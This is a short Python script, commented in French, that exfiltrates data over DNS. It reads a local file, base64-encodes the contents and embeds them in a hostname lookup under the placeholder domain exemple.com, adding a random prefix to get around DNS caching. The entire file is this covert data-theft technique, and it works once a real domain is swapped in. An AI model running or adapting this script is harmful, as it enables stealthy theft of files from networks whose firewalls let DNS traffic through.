#/usr/bin/env python3
import socket
import base64
import random
f = open("toOut/test.txt", "r") #on ouvre le fichier à exflitrer
socket.gethostbyname(str(random.random())+".separator."+str(base64.b64encode(f.read().encode("utf-8")))+".exemple.com") #on encode le fichier en base64 et on fait une requete dns sur random.separator.xxxx.exemple.com (xxxx est le fichier encoder en base 64) (random est nombre pour contourner le dns buffering)
f.close() #on ferme le fichier
